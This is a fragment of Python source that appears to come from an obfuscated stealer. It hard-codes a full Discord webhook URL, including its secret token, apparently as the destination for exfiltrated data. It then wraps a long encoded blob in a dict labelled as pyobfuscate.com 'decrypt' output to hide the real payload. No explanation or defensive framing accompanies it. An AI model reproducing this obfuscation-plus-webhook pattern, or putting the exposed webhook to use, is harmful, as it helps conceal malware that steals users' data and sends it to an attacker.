...
hook = "https://discord.com/api/webhooks/1152974276627021875/z10pZQVuGEaL1BbjLFxY8G8Jc-1yKeAe6gnYM5vnG51A9FEEzqrWvm3MhMzXxXzRwVXZ"
...
obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(decrypt)'],['''AoaVTCW@>`@owX2y}=|nPr&RW&;F2LVTyJpWHbhC>W7{)u=hXfwCi{PpogB&A(DbBUz1BC*~hfdZF?8%xwP|Csr#g0XrNmMgvH~kH(3jn9CaWp_(r>lv$p&_%Mq?sb>NVtg8@ggjpCxtHgxpLq0Q$Pm=#4J@n;|<{s)q<pB~i(EBg'''.replace('\n','')]))
